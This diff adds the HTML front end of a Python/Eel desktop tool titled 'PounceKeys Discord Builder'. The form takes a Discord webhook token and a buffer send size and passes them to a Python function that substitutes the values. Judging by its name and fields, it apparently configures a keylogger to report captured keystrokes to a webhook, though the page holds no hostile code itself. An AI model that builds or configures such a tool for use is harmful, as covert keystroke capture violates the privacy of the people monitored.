@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PounceKeys Discord Builder</title>
+    <style>
+        body {
+            background-color: #2d2d2d;
+            font-family: Arial, sans-serif;
+            color: #d8d8d8;
+            margin: 0;
+            padding: 0;
+        }
+        h2 {
+            color: #a94fd3;
+        }
+        .container {
+            display: flex;
+            justify-content: space-between;
+            padding: 20px;
+        }
+        .builder {
+            background-color: #3c3c3c;
+            border-radius: 10px;
+            padding: 20px;
+            width: 30%;
+        }
+        .input-label {
+            color: #a94fd3;
+            margin-bottom: 10px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 8px;
+            border-radius: 5px;
+            border: 1px solid #a94fd3;
+            background-color: #474747;
+            color: #d8d8d8;
+        }
+        .message {
+            margin-top: 10px;
+            overflow-y: scroll;
+            max-height: 100px;
+            padding: 10px;
+            background-color: #474747;
+            color: #d8d8d8;
+            border-radius: 5px;
+        }
+        .replace-button {
+            background-color: #a94fd3;
+            color: #d8d8d8;
+            border: none;
+            border-radius: 5px;
+            padding: 10px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .replace-button:hover {
+            background-color: #8242a9;
+        }
+    </style>
+</head>
+<body>
+
+<h2>PounceKeys Discord Builder</h2>
+
+<div class="container">
+    <div class="builder">
+        <div class="input-group">
+            <label for="webhook_token" class="input-label">Webhook Bot Token:</label>
+            <input type="text" id="webhook_token" class="input-field">
+        </div>
+        <div class="input-group"> <!-- Added input group for Buffer Send Size -->
+            <label for="buffer_send_size" class="input-label">Buffer Send Size:</label>
+            <input type="text" id="buffer_send_size" class="input-field">
+        </div>
+        <button class="replace-button" onclick="replaceValues('webhook_token', 'buffer_send_size', 'discord_message')">Replace Value</button> <!-- Updated onclick function -->
+        <div id="discord_message" class="message"></div>
+    </div>
+</div>
+
+<script src="eel.js"></script>
+<script>
+    async function replaceValues(input1, input2, messageDivId) {
+        const inputField1 = document.getElementById(input1);
+        const inputField2 = document.getElementById(input2);
+        const messageDiv = document.getElementById(messageDivId);
+
+        const inputValue1 = inputField1.value;
+        const inputValue2 = inputField2.value;
+
+        // Show "Values updated!" message
+        messageDiv.innerHTML = "Replacing values...";
+
+        // Call Python function to replace values
+        const response = await eel.replace_values(inputValue1, inputValue2)();
+
+        // Update messageDiv with response
+        messageDiv.innerHTML = response;
+
+        // Update messageDiv again to show "Values updated!" message
+        messageDiv.innerHTML = "Values updated!";
+    }
+</script>
+
+<script>
+    eel.expose(updateMessage);
+
+    function updateMessage(messageDivId, newMessage) {
+        const messageDiv = document.getElementById(messageDivId);
+        const currentMessage = messageDiv.innerHTML;
+        messageDiv.innerHTML = currentMessage + "<br>" + newMessage;
+    }
+</script>
+
+</body>
+</html>
